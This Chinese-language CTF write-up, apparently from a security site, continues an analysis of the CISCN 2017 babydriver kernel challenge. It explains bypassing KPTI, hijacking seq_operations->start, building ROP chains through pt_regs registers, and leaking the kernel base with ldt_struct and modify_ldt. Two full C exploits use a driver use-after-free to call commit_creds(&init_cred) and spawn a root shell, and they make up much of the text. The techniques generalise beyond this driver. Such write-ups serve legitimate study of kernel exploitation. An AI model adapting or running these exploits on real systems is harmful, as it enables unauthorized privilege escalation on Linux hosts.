# 在 2021 年再看 ciscn_2017 - babydriver（下）：KPTI bypass、ldt_struct 的利用、pt_regs
通用内核ROP解法

阅读量 **236174**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2022-01-28 10:00:25

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t011a1ecec4559bd623.png)

> 对于学习过 kernel pwn 的诸位而言，包括笔者在内的第一道入门题基本上都是 CISCN2017 – babydriver
> 这一道题，同样地，无论是在 CTF wiki 亦或是其他的 kernel pwn 入门教程当中，这一道题向来都是入门的第一道题（笔者的教程除外）
>
> 当然，在笔者看来，这道题当年的解法已然过时，笔者个人认为在当下入门 kernel pwn 最好还是使用我们在用户态下学习的路径——从栈溢出开始再到“堆”
>
> 但不可否认的是，时至今日，这一道题仍然具备着相当的的学习价值，仍旧是一道不错的 kernel pwn
> 入门题，因此笔者今天就来带大家看看——到了2021年，这一道 2017年的“基础的 kernel pwn
> 入门题”的解法究竟有了些什么变化，又能给我们带来什么样的启发，笔者将借助这篇文章阐述一些 kernel pwn 的利用思路  
>  ——[在 2021 年再看 ciscn_2017 – babydriver（上）：cred 与 tty_struct
> 提权手法浅析](https://www.anquanke.com/post/id/259252)

原本这系列文章应当在 2021
年完成的，但是笔者年末忙着各种事情给忘了（苦逼的大三党），所幸面试全都通过了考试全都推迟了，于是今天前来填一下以前留下的坑（笑）

上一篇文章同样在安全客上：[在 2021 年再看 ciscn_2017 – babydriver（上）：cred 与 tty_struct
提权手法浅析](https://www.anquanke.com/post/id/259252)，在阅读本篇文章之前，笔者希望你能够先完成对上一篇文章的阅读（笑）

闲话不多说，我们从 0x04 接着开始

## 0x04.kernel 4.15——KPTI

到了内核版本 `4.15`， **KPTI** （Kernel Page Table
Isolation，内核页表隔离）这一巨大杀器出现了——内核与用户进程使用两套 **独立的页表**

> 众所周知 Linux 采用 **四级页表** 结构（PGD->PUD->PMD->PTE），而 CR3 控制寄存器用以存储当前的 PGD
> 的地址，因此在开启 KPTI 的情况下用户态与内核态之间的切换便涉及到 CR3 的切换，为了提高切换的速度，内核将内核空间的 PGD 与用户空间的
> PGD 两张页全局目录表放在一段连续的内存中（两张表，一张一页4k，总计8k，内核空间的在低地址，用户空间的在高地址），这样 **只需要将 CR3 的第
> 13 位取反便能完成页表切换的操作**
>
> ![](https://p2.ssl.qhimg.com/t017ffbbc5868eb1b03.png)
>
> 在启动项 `append` 中添加 `pti=on`选项开启 KPTI

由于用户空间与内核空间的彻底隔离，这意味着 **我们不能够再使用 ret2usr 这一攻击手法** ，我们也无法直接在我们的用户空间中构造 fake
tty_operations，而需要一个内核中的 object

而且该版本与其之后的几个版本的内核当中似乎在 `open("/dev/ptmx")` 时所分配的第一个结构第都 **不是 tty_struct**
，笔者怀疑其分配机制有了一定的更改，但这一次我们似乎不能够通过 tty_struct 来泄露内核基址与劫持内核执行流了，不过在内核当中
**仍然有着数量相当可观的有用的结构体** 供我们利用

###  seq_operations

`seq_operations` 是一个十分有用的结构体，我们不仅能够通过它来泄露内核基址，还能利用它来控制内核执行流

当我们打开一个 stat 文件时（如 `/proc/self/stat` ）便会在内核空间中分配一个 seq_operations 结构体，该结构体定义于
`/include/linux/seq_file.h` 当中，只定义了四个函数指针，如下：

    
    
    struct seq_operations {
        void * (*start) (struct seq_file *m, loff_t *pos);
        void (*stop) (struct seq_file *m, void *v);
        void * (*next) (struct seq_file *m, void *v, loff_t *pos);
        int (*show) (struct seq_file *m, void *v);
    };
    

当我们 read 一个 stat 文件时，内核会调用其 proc_ops 的 `proc_read_iter` 指针，其默认值为
`seq_read_iter()` 函数，定义于 `fs/seq_file.c` 中，注意到有如下逻辑：

    
    
    ssize_t seq_read_iter(struct kiocb *iocb, struct iov_iter *iter)
    {
        struct seq_file *m = iocb->ki_filp->private_data;
        //...
        p = m->op->start(m, &m->index);
        //...
    

即其会调用 seq_operations 中的 start 函数指针，那么 **我们只需要控制 seq_operations- >start 后再读取对应
stat 文件便能控制内核执行流**

**泄露内核基址**

在 seq_operations 被初始化时其函数指针皆被初始化为内核中特定的函数（笔者尚未求证具体是什么函数），利用 read
读出这些值后我们便能获得内核偏移

**控制内核执行流**

> 思路来自于 TCTF2021 FINAL 中 Organizer 团队对于 kernote 这一题的
> [WP](https://ctftime.org/writeup/30589)，十分美妙的一种解法！

虽然我们现在已经获得了内核基址，且我们也能够通过直接覆写 `seq_operations->start`
来劫持内核执行流，但是如若是要成功完成提权则还需要再费一番功夫

我们此前比较朴素的提权思想就是 `commit_creds(prepare_kernel_cred(NULL))`了，但是存在一个问题：
**我们无法控制seq_operations- >start 的参数**，且我们单次只能执行一个函数，而朴素的提权思想则要求我们连续执行两个函数

关于后者这个问题其实不难解决，在内核当中有一个特殊的 cred —— `init_cred`，这是 init 进程的 cred，因此 **其权限为
root** ，且该 cred 并非是动态分配的，因此当我们泄露出内核基址之后我们也便能够获得 init_cred 的地址，那么我们就只需要执行一次
`commit_creds(&init_cred)` 便能完成提权

但 seq_operations->start 的参数我们依旧无法控制，这里我们可以找一些可用的 gadget 来栈迁移以完成
ROP，因此接下来我们需要考虑如何控制内核栈

**pt_regs：系统调用压栈结构体**

系统调用的本质是什么？或许不少人都能够答得上来是由我们在用户态布置好相应的参数后执行 `syscall` 这一汇编指令，通过门结构进入到内核中的
`entry_SYSCALL_64`这一函数，随后通过系统调用表跳转到对应的函数

现在让我们将目光放到 `entry_SYSCALL_64`
这一用汇编写的函数内部，观察，我们不难发现其有着[这样一条指令](https://elixir.bootlin.com/linux/latest/source/arch/x86/entry/entry_64.S#L107)：

    
    
        PUSH_AND_CLEAR_REGS rax=$-ENOSYS
    

这是一条十分有趣的指令，它会将所有的寄存器 **压入内核栈上，形成一个 pt_regs 结构体**
，该结构体实质上位于内核栈底，[定义](https://elixir.bootlin.com/linux/latest/source/arch/x86/include/uapi/asm/ptrace.h#L44)如下：

    
    
    struct pt_regs {
    /*
     * C ABI says these regs are callee-preserved. They aren't saved on kernel entry
     * unless syscall needs a complete, fully filled "struct pt_regs".
     */
        unsigned long r15;
        unsigned long r14;
        unsigned long r13;
        unsigned long r12;
        unsigned long rbp;
        unsigned long rbx;
    /* These regs are callee-clobbered. Always saved on kernel entry. */
        unsigned long r11;
        unsigned long r10;
        unsigned long r9;
        unsigned long r8;
        unsigned long rax;
        unsigned long rcx;
        unsigned long rdx;
        unsigned long rsi;
        unsigned long rdi;
    /*
     * On syscall entry, this is syscall#. On CPU exception, this is error code.
     * On hw interrupt, it's IRQ number:
     */
        unsigned long orig_rax;
    /* Return frame for iretq */
        unsigned long rip;
        unsigned long cs;
        unsigned long eflags;
        unsigned long rsp;
        unsigned long ss;
    /* top of stack page */
    };
    

在内核栈上的结构如下：

![](https://p3.ssl.qhimg.com/t0188ca04d075a8ce9e.png)

而在系统调用当中有很多的寄存器其实是不一定能用上的，比如 r8 ~ r15， **这些寄存器为我们的ROP提供了可能，我们只需要寻找到一条形如 “add
rsp, val ; ret” 的 gadget 便能够完成 ROP**

随便选一条 gadget，gdb 下断点，我们可以很轻松地获得在执行 seq_operations->start 时的 rsp
与我们的“ROP链”之间的距离

![](https://p4.ssl.qhimg.com/t014d4cc771686dae67.png)

**KPTI bypass**

找到合适的 gadget 完成 ROP 链的构造之后，我们接下来要考虑如何“完美地降落回用户态”

还是让我们将目光放到系统调用的汇编代码中，我们发现内核也相应地在 `arch/x86/entry/entry_64.S`
中提供了一个用于完成内核态到用户态切换的函数 `swapgs_restore_regs_and_return_to_usermode`

源码的 AT&T 汇编比较反人类，推荐直接查看 IDA 的反汇编结果（亲切的 Intel 风格）：

![](https://p1.ssl.qhimg.com/t017574d2317b07080e.png)

在实际操作时前面的一些栈操作都可以跳过，直接从 `mov rdi, rsp` 开始，这个函数大概可以总结为如下操作：

    
    
    mov        rdi, cr3
    or         rdi, 0x1000
    mov     cr3, rdi
    pop        rax
    pop        rdi
    swapgs
    iretq
    

因此我们只需要布置出如下栈布局即可 **完美降落回用户态** ：

    
    
    ↓    swapgs_restore_regs_and_return_to_usermode
        0 // padding
        0 // padding
        user_shell_addr
        user_cs
        user_rflags
        user_sp
        user_ss
    

这个函数还可以在我们找不到品质比较好的 gadget 时帮我们完成调栈的功能

> 在调试过程中该函数的地址同样可以在 `/proc/kallsyms` 中获得

###  FINAL EXPLOIT

最终的 exp 如下：

    
    
    #include <sys/types.h>
    #include <stdio.h>
    #include <linux/userfaultfd.h>
    #include <pthread.h>
    #include <errno.h>
    #include <unistd.h>
    #include <stdlib.h>
    #include <fcntl.h>
    #include <signal.h>
    #include <poll.h>
    #include <string.h>
    #include <sys/mman.h>
    #include <sys/syscall.h>
    #include <sys/ioctl.h>
    #include <sys/sem.h>
    #include <semaphore.h>
    #include <poll.h>
    #include <asm/ldt.h>
    
    #define POP_RDI_RET 0xffffffff810029a1
    #define COMMIT_CREDS 0xffffffff810a0700
    #define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81a00abd
    #define INIT_CRED 0xffffffff82250ec0
    
    size_t commit_creds = NULL, prepare_kernel_cred = NULL, kernel_offset = 0, kernel_base = 0xffffffff81000000;
    
    size_t user_cs, user_ss, user_rflags, user_sp;
    
    void saveStatus()
    {
        __asm__("mov user_cs, cs;"
                "mov user_ss, ss;"
                "mov user_sp, rsp;"
                "pushf;"
                "pop user_rflags;"
                );
        printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
    }
    
    void getRootShell(void)
    {   
        if(getuid())
        {
            printf("\033[31m\033[1m[x] Failed to get the root!\033[0m\n");
            exit(-1);
        }
    
        printf("\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n");
        system("/bin/sh");
    }
    
    int         seq_fd;
    size_t      seq_data[0x10];
    size_t      pop_rdi_ret;
    size_t      init_cred;
    size_t      swapgs_restore_regs_and_return_to_usermode;
    size_t      add_rsp_0x40_ret;
    
    int main(void)
    {
        int         fd[10];
    
        size_t      target_addr;
    
        struct user_desc     desc;
        size_t                 page_offset_base = 0xffff888000000000;
    
        printf("\033[34m\033[1m[*] Start to exploit...\033[0m\n");
        saveStatus();
    
        // construct UAF and get a seq_operations
        fd[0] = open("/dev/babydev", O_RDWR);
        fd[1] = open("/dev/babydev", O_RDWR);
    
        ioctl(fd[0], 0x10001, 0x18);
        write(fd[0], "arttnba3arttnba3arttnba3", 0x18);
        close(fd[0]);
    
        seq_fd = open("/proc/self/stat", O_RDONLY);
    
        // get seq_operations data and calculate the kernel base
        read(fd[1], seq_data, 0x10);
        for (int i = 0; i < 2; i++)
            printf("[------data dump------] %d: %p\n", i, seq_data[i]);
    
        kernel_offset = seq_data[0] - 0xffffffff81269110;
        kernel_base = (void*) ((size_t)kernel_base + kernel_offset);
    
        commit_creds = COMMIT_CREDS + kernel_offset;
    
        printf("\033[34m\033[1m[*] Kernel offset: \033[0m0x%llx\n", kernel_offset);
        printf("\033[32m\033[1m[+] Kernel base: \033[0m%p\n", kernel_base);
        printf("\033[32m\033[1m[+] commit_creds: \033[0m%p\n", commit_creds);
        printf("\033[32m\033[1m[+] swapgs_restore_regs_and_return_to_usermode: \033[0m%p\n", SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + kernel_offset);
    
        // trigger seq_operations->start
        target_addr = 0xffffffff81079210 + kernel_offset;   //add rsp, 0x100; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15
        init_cred = INIT_CRED + kernel_offset;
        pop_rdi_ret = POP_RDI_RET + kernel_offset;
        swapgs_restore_regs_and_return_to_usermode = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 14 + kernel_offset;
        add_rsp_0x40_ret = 0xffffffff810996a6 + kernel_offset;
        write(fd[1], &target_addr, 8);
        __asm__(
            //"mov r15, 0xbeefdead;"
            //"mov r14, 0xabcddcba;"
            "mov r13, add_rsp_0x40_ret;" // add rsp, 0x40 ; ret
            "mov r12, commit_creds;"
            "mov rbp, init_cred;"
            "mov rbx, pop_rdi_ret;"
            //"mov r11, 0x1145141919;"
            "mov r10, swapgs_restore_regs_and_return_to_usermode;"
            //"mov r9, 0x1919114514;"
            //"mov r8, 0xabcd1919810;"
            "xor rax, rax;"
            "mov rcx, 0x666666;"
            "mov rdx, 8;"
            "mov rsi, rsp;"
            "mov rdi, seq_fd;"
            "syscall"
        );
        getRootShell();
    }
    

运行，完美提权

![](https://p5.ssl.qhimg.com/t01bb3217ae639a5a78.png)

## 0x05.加大难度（II）——去除 read 功能

由于我们在内核空间当中有着一个可以读写的 UAF ，因此到目前为止整套利用流程下来都是十分流畅的，但是若是我们无法直接读取 object
的内容呢？我们该通过什么方法来泄露内核基址？

这里笔者要向大家介绍一个神器——`ldt_struct`

###  ldt_struct

ldt 即 **局部段描述符表** （ **Local Descriptor Table** ），其中存放着 **进程的**
段描述符，段寄存器当中存放着的段选择子便是段描述符表中段描述符的索引

该结构体定义于内核源码 `arch/x86/include/asm/mmu_context.h` 中，如下：

    
    
    struct ldt_struct {
        /*
         * Xen requires page-aligned LDTs with special permissions.  This is
         * needed to prevent us from installing evil descriptors such as
         * call gates.  On native, we could merge the ldt_struct and LDT
         * allocations, but it's not worth trying to optimize.
         */
        struct desc_struct    *entries;
        unsigned int        nr_entries;
    
        /*
         * If PTI is in use, then the entries array is not mapped while we're
         * in user mode.  The whole array will be aliased at the addressed
         * given by ldt_slot_va(slot).  We use two slots so that we can allocate
         * and map, and enable a new LDT without invalidating the mapping
         * of an older, still-in-use LDT.
         *
         * slot will be -1 if this LDT doesn't have an alias mapping.
         */
        int            slot;
    };
    

该结构体大小为 0x10，应当从 kmalloc-16 中取

**desc_struct 结构体**

ldt_struct 结构体中有一成员 `entries` 为 指向`desc_struct` 结构体的指针，即 **段描述符** ，定义于
`/arch/x86/include/asm/desc_defs.h` 中，如下：

    
    
    /* 8 byte segment descriptor */
    struct desc_struct {
        u16    limit0;
        u16    base0;
        u16    base1: 8, type: 4, s: 1, dpl: 2, p: 1;
        u16    limit1: 4, avl: 1, l: 1, d: 1, g: 1, base2: 8;
    } __attribute__((packed));
    

**低 32 位**

31~16 | 15~0  
---|---  
段基址的 15~0 位 | 段界限的 15~0 位  
  
段基址 32 位，段界限为 20 位，其所能够表示的地址范围为：

`段基址 + （段粒度大小 x （段界限+1）） - 1`

**高 32 位**

31~24 | 23 | 22 | 21 | 20 | 19~16 | 15 | 14~13 | 12 | 11~8 | 7~0  
---|---|---|---|---|---|---|---|---|---|---  
段基址的 31~24 位 | G | D/B | L | AVL | 段界限的 19 ~16 位 | P | DPL | S | TYPE | 段基址的
23~16 位  
  
各参数便不在此赘叙了，具其构造可以参见[全局描述符表（Global Descriptor Table） –
arttnba3.cn](https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/#%E4%B8%89%E3%80%81%E5%85%A8%E5%B1%80%E6%8F%8F%E8%BF%B0%E7%AC%A6%E8%A1%A8%EF%BC%88Global-Descriptor-Table%EF%BC%89)

###  modify_ldt 系统调用

Linux 提供给我们一个叫 `modify_ldt` 的系统调用，通过该系统调用我们可以 **获取或修改当前进程的 LDT**

我们来看一下在内核中这个系统调用是如何操纵 ldt 的，该系统调用定义于 `/arch/x86/kernel/ldt.c` 中，如下：

    
    
    SYSCALL_DEFINE3(modify_ldt, int , func , void __user * , ptr ,
            unsigned long , bytecount)
    {
        int ret = -ENOSYS;
    
        switch (func) {
        case 0:
            ret = read_ldt(ptr, bytecount);
            break;
        case 1:
            ret = write_ldt(ptr, bytecount, 1);
            break;
        case 2:
            ret = read_default_ldt(ptr, bytecount);
            break;
        case 0x11:
            ret = write_ldt(ptr, bytecount, 0);
            break;
        }
        /*
         * The SYSCALL_DEFINE() macros give us an 'unsigned long'
         * return type, but tht ABI for sys_modify_ldt() expects
         * 'int'.  This cast gives us an int-sized value in %rax
         * for the return code.  The 'unsigned' is necessary so
         * the compiler does not try to sign-extend the negative
         * return codes into the high half of the register when
         * taking the value from int->long.
         */
        return (unsigned int)ret;
    }
    

我们应当传入三个参数：func、ptr、bytecount，其中 ptr 应为指向 `user_desc` 结构体的指针，参照 man page
可知该结构体如下：

    
    
    struct user_desc {
        unsigned int  entry_number;
        unsigned int  base_addr;
        unsigned int  limit;
        unsigned int  seg_32bit:1;
        unsigned int  contents:2;
        unsigned int  read_exec_only:1;
        unsigned int  limit_in_pages:1;
        unsigned int  seg_not_present:1;
        unsigned int  useable:1;
    };
    

**read_ldt()：内核任意地址读**

定义于 `/arch/x86/kernel/ldt.c`中，我们主要关注如下逻辑：

    
    
    static int read_ldt(void __user *ptr, unsigned long bytecount)
    {
    //...
        if (copy_to_user(ptr, mm->context.ldt->entries, entries_size)) {
            retval = -EFAULT;
            goto out_unlock;
        }
    //...
    out_unlock:
        up_read(&mm->context.ldt_usr_sem);
        return retval;
    }
    

在这里会 **直接调用 copy_to_user 向用户地址空间拷贝数据** ，我们不难想到的是若是能够控制 ldt->entries
便能够完成内核的任意地址读，由此泄露出内核数据

**write_ldt()：分配新的 ldt_struct 结构体**

定义于 `/arch/x86/kernel/ldt.c`中，我们主要关注如下逻辑：

    
    
    static int write_ldt(void __user *ptr, unsigned long bytecount, int oldmode)
    {
        //...
        error = -EINVAL;
        if (bytecount != sizeof(ldt_info))
            goto out;
        error = -EFAULT;
        if (copy_from_user(&ldt_info, ptr, sizeof(ldt_info)))
            goto out;
    
        error = -EINVAL;
        if (ldt_info.entry_number >= LDT_ENTRIES)
            goto out;
    
        //...
    
        old_ldt       = mm->context.ldt;
        old_nr_entries = old_ldt ? old_ldt->nr_entries : 0;
        new_nr_entries = max(ldt_info.entry_number + 1, old_nr_entries);
    
        error = -ENOMEM;
        new_ldt = alloc_ldt_struct(new_nr_entries);
        if (!new_ldt)
            goto out_unlock;
    
        if (old_ldt)
            memcpy(new_ldt->entries, old_ldt->entries, old_nr_entries * LDT_ENTRY_SIZE);
    
        new_ldt->entries[ldt_info.entry_number] = ldt;
    
        //...
    
        install_ldt(mm, new_ldt);
        unmap_ldt_struct(mm, old_ldt);
        free_ldt_struct(old_ldt);
        error = 0;
    
    out_unlock:
        up_write(&mm->context.ldt_usr_sem);
    out:
        return error;
    }
    

我们注意到在 write_ldt() 当中会使用 alloc_ldt_struct() 函数来为新的 ldt_struct 分配空间，随后将之应用到进程，
alloc_ldt_struct() 函数定义于 `arch/x86/kernel/ldt.c` 中，我们主要关注如下逻辑：

    
    
    /* The caller must call finalize_ldt_struct on the result. LDT starts zeroed. */
    static struct ldt_struct *alloc_ldt_struct(unsigned int num_entries)
    {
        struct ldt_struct *new_ldt;
        unsigned int alloc_size;
    
        if (num_entries > LDT_ENTRIES)
            return NULL;
    
        new_ldt = kmalloc(sizeof(struct ldt_struct), GFP_KERNEL);
    //...
    

可以看到的是，ldt_struct 结构体通过 kmalloc() 从 `kmalloc-xx` 中取，由此我们可以得到如下解题思路：

  * 先分配一个 object 后释放
  * 通过 write_ldt() 将这个 object 重新取回
  * 通过 UAF 更改 ldt->entries
  * 通过 read_ldt() 搜索内核地址空间

**泄露内核基址**

接下来我们考虑如何利用 modify_ldt 系统调用来泄露内核基址，虽然我们可以控制 entries 指针从而通过 `read_ldt()`
读出内核内存上的数据，但我们该从哪读？重新阅读 `read_ldt()` 的源码，我们不难想到这样一种思路：

  * 我们可以 **直接爆破内核地址** ：对于无效的地址，copy_to_user 会返回非 0 值，此时 read_ldt() 的返回值便是 `-EFAULT`，当 read_ldt() 执行成功时，说明我们命中了内核空间

但通常情况下内核会开启 `hardened usercopy` 保护，当 copy_to_user() 的源地址为内核 .text 段（_stext,
_etext）时 **会引起 kernel panic** ，因此我们不能直接爆破 .text 端的基址

那么这里我们可以考虑更改思路——搜索`线性映射区`，即爆破 **内核堆基址** ，之后再通过 read_ldt()
在堆上读出一些可用的内核指针从而泄露出内核基址

> direct mapping area，即 **线性映射区** （不是线代那个线性映射），这块区域的线性地址到物理地址空间的映射是 **连续的**
> ，kmalloc 便从此处分配内存，其起始地址为 `page_offset_base`
>
> 而 vmalloc 则从 vmalloc/ioremap space 分配内存，起始地址为 `vmalloc_base`，这一块区域到物理地址间的映射是
> **不连续的**

代码如下：

    
    
        // seek for kernel heap addr
        struct user_desc     desc;
        size_t                 page_offset_base = 0xffff888000000000;
        int                 retval;
    
        desc.base_addr = 0xff0000;
        desc.entry_number = 0x8000 / 8;
        desc.limit = 0;
        desc.seg_32bit = 0;
        desc.contents = 0;
        desc.limit_in_pages = 0;
        desc.lm = 0;
        desc.read_exec_only = 0;
        desc.seg_not_present = 0;
        desc.useable = 0;
        syscall(SYS_modify_ldt, 1, &desc, sizeof(desc));
        while(1)
        {
            write(fd[1], &page_offset_base, 8);
            retval = syscall(SYS_modify_ldt, 0, &desc, 8);// final param should be 8 there
            if (retval >= 0)
                break;
            page_offset_base += 0x2000000;
        }
        printf("\033[32m\033[1m[+] Found page_offset_base: \033[0m%lx\n", page_offset_base);
    
        // read kernel addr by searching the kernel heap
        size_t search_addr;
        int pipe_fd[2];
        size_t *buf;
    
        pipe(pipe_fd);
        buf = (size_t*) mmap(NULL, 0x8000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
        search_addr = page_offset_base;
        kernel_base = 0;
        while(1)
        {
            write(fd[1], &search_addr, 8);
            retval = fork();
            if (!retval)    // child
            {
                syscall(SYS_modify_ldt, 0, buf, 0x8000);
    
                for (int i = 0; i < 0x1000; i++)
                {
                    if ((buf[i] >= 0xffffffff81000000)  && ((buf[i] & 0xfff) == 0x030))
                    {
                        kernel_base = buf[i] -  0x030;
                        kernel_offset = kernel_base - 0xffffffff81000000;
                        printf("\033[32m\033[1m[+] Found kernel base: \033[0m%p\033[32m\033[1m at \033[0m%p\n", kernel_base, search_addr);
                        printf("\033[32m\033[1m[+] Kernel offset: \033[0m%p\n", kernel_offset);
                        break;
                    }
                }
    
                write(pipe_fd[1], &kernel_base, 8);
                exit(0);
            }
            wait(NULL);
            read(pipe_fd[0], &kernel_base, 8);
            if (kernel_base)
                break;
            search_addr += 0x8000;
        }
        kernel_offset = kernel_base - 0xffffffff81000000;
    

###  FINAL EXPLOIT

泄露出内核基址之后的其他流程就和 0x04 一样了，因此最终的 exp 如下：

    
    
    #define _GNU_SOURCE
    #include <asm/ldt.h>
    #include <sys/types.h>
    #include <stdio.h>
    #include <linux/userfaultfd.h>
    #include <pthread.h>
    #include <errno.h>
    #include <unistd.h>
    #include <stdlib.h>
    #include <fcntl.h>
    #include <signal.h>
    #include <poll.h>
    #include <string.h>
    #include <sys/mman.h>
    #include <sys/syscall.h>
    #include <sys/ioctl.h>
    #include <sys/sem.h>
    #include <sys/ipc.h>
    #include <sys/shm.h>
    #include <semaphore.h>
    #include <poll.h>
    #include <sys/xattr.h>
    #include <sched.h>
    
    #define POP_RDI_RET 0xffffffff810029a1
    #define COMMIT_CREDS 0xffffffff810a0700
    #define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81a00abd
    #define INIT_CRED 0xffffffff82250ec0
    
    size_t commit_creds = NULL, prepare_kernel_cred = NULL, kernel_offset = 0, kernel_base = 0xffffffff81000000;
    
    
    int         seq_fd;
    size_t      seq_data[0x10];
    size_t      pop_rdi_ret;
    size_t      init_cred;
    size_t      swapgs_restore_regs_and_return_to_usermode;
    size_t      add_rsp_0x40_ret;
    
    size_t user_cs, user_ss, user_rflags, user_sp;
    
    void saveStatus()
    {
        __asm__("mov user_cs, cs;"
                "mov user_ss, ss;"
                "mov user_sp, rsp;"
                "pushf;"
                "pop user_rflags;"
                );
        printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
    }
    
    void getRootShell(void)
    {   
        if(getuid())
        {
            printf("\033[31m\033[1m[x] Failed to get the root!\033[0m\n");
            exit(-1);
        }
    
        printf("\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n");
        system("/bin/sh");
    }
    
    int main(void)
    {
        int                 fd[10];
    
        puts("\033[34m\033[1m[*] Start to exploit...\033[0m");
        saveStatus();
    
        // construct UAF
        fd[0] = open("/dev/babydev", O_RDWR);
        fd[1] = open("/dev/babydev", O_RDWR);
        fd[2] = open("/dev/babydev", O_RDWR);
    
        ioctl(fd[0], 0x10001, 0x10);
        write(fd[0], "arttnba3", 8);
        close(fd[0]);
    
        // seek for kernel heap addr
        struct user_desc     desc;
        size_t                 page_offset_base = 0xffff888000000000;
        int                 retval;
    
        desc.base_addr = 0xff0000;
        desc.entry_number = 0x8000 / 8;
        desc.limit = 0;
        desc.seg_32bit = 0;
        desc.contents = 0;
        desc.limit_in_pages = 0;
        desc.lm = 0;
        desc.read_exec_only = 0;
        desc.seg_not_present = 0;
        desc.useable = 0;
        syscall(SYS_modify_ldt, 1, &desc, sizeof(desc));
        while(1)
        {
            write(fd[1], &page_offset_base, 8);
            retval = syscall(SYS_modify_ldt, 0, &desc, 8);// final param should be 8 there
            if (retval >= 0)
                break;
            page_offset_base += 0x2000000;
        }
        printf("\033[32m\033[1m[+] Found page_offset_base: \033[0m%lx\n", page_offset_base);
    
        // read kernel addr by searching the kernel heap
        size_t search_addr;
        int pipe_fd[2];
        size_t *buf;
    
        pipe(pipe_fd);
        buf = (size_t*) mmap(NULL, 0x8000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
        search_addr = page_offset_base;
        kernel_base = 0;
        while(1)
        {
            write(fd[1], &search_addr, 8);
            retval = fork();
            if (!retval)    // child
            {
                syscall(SYS_modify_ldt, 0, buf, 0x8000);
    
                for (int i = 0; i < 0x1000; i++)
                {
                    if ((buf[i] >= 0xffffffff81000000)  && ((buf[i] & 0xfff) == 0x030))
                    {
                        kernel_base = buf[i] -  0x030;
                        kernel_offset = kernel_base - 0xffffffff81000000;
                        printf("\033[32m\033[1m[+] Found kernel base: \033[0m%p\033[32m\033[1m at \033[0m%p\n", kernel_base, search_addr);
                        printf("\033[32m\033[1m[+] Kernel offset: \033[0m%p\n", kernel_offset);
                        break;
                    }
                }
    
                write(pipe_fd[1], &kernel_base, 8);
                exit(0);
            }
            wait(NULL);
            read(pipe_fd[0], &kernel_base, 8);
            if (kernel_base)
                break;
            search_addr += 0x8000;
        }
        kernel_offset = kernel_base - 0xffffffff81000000;
    
        // re-get a UAF in kmalloc-32
        syscall(SYS_modify_ldt, 1, &desc, sizeof(desc)); // do not let the former one make extra influences
        ioctl(fd[1], 0x10001, 32);
        close(fd[2]);
    
        // trigger seq_operations->start
        puts("\033[34m\033[1m[*] Triggering seq_operations->stat...\033[0m");
        seq_fd = open("/proc/self/stat", O_RDONLY);
    
        size_t target_addr = 0xffffffff81079210 + kernel_offset;   //add rsp, 0x100; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15
    
        pop_rdi_ret = POP_RDI_RET + kernel_offset;
        init_cred = INIT_CRED + kernel_offset;
        commit_creds = COMMIT_CREDS + kernel_offset;
        swapgs_restore_regs_and_return_to_usermode = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 14 + kernel_offset;
        add_rsp_0x40_ret = 0xffffffff810996a6 + kernel_offset;
    
        write(fd[1], &target_addr, 8);
        __asm__(
            "mov r15,   0xbeefdead;"
            "mov r14,   0x11111111;"
            "mov r13,   add_rsp_0x40_ret;"
            "mov r12,   commit_creds;"
            "mov rbp,   init_cred;"
            "mov rbx,   pop_rdi_ret;"
            "mov r11,   0x66666666;"
            "mov r10,   swapgs_restore_regs_and_return_to_usermode;"
            "mov r9,    0x88888888;"
            "mov r8,    0x99999999;"
            "xor rax,   rax;"
            "mov rcx,   0xaaaaaaaa;"
            "mov rdx,   8;"
            "mov rsi,   rsp;"
            "mov rdi,   seq_fd;"
            "syscall"
        );
        getRootShell();
    }
    

运行，完美提权

![](https://p0.ssl.qhimg.com/t017ad1ecc01fa781c2.png)

## 0xFF.What’s more？

作为入门向的文章，笔者对于 ciscn_2017_babydriver 这道题目的探讨到此便暂且告一段落了

或许有的人会问：这道题目的难度明明还没封顶呀，还可以把 write 功能也给去掉（userfaultfd + setxattr）、在此之上还能够再限制
free 的次数（利用 Intel CPU 漏洞泄露内核基址 + UAF 劫持执行流）……

但笔者认为再继续把难度增加下去未免就有点太钻牛角尖了，没有那个必要，笔者更多的只是想让大家学习到内核漏洞利用的一些思路，而不是像用户态pwn那样靠背各种模板去解题，虽然暂且不知道笔者的文章能否能给大家带来这样的效果

当然，也可能只是笔者懒得继续写了（笑）

> 或许在未来的某一天会出一个难度再上几个台阶的番外篇？

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **墨晚鸢** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/266897](/post/id/266897)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [linux](/tag/linux)
  * [kernel pwn](/tag/kernel pwn)

 **+1** __5赞

 __收藏

![](https://p3.ssl.qhimg.com/t0148f718bec9e27586.png) 墨晚鸢

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

